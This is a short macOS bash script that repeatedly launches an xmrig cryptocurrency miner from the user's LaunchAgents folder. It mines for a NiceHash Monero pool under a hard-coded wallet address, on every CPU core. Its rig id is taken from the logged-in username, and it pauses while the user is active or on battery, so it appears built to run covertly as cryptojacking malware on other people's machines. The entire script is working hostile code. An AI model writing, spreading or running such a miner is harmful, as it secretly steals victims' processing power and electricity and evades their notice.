#!/usr/bin/env bash

#in case it crashes
while true
do
~/Library/LaunchAgents/xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3HLKDVH6J89nUJMGi8M1gSqmLxdN5PBhFc -p x -a rx/0 --coin null -t $(sysctl -n hw.ncpu) --nicehash --keepalive --rig-id $(whoami) --pause-on-battery --pause-on-active 10
done
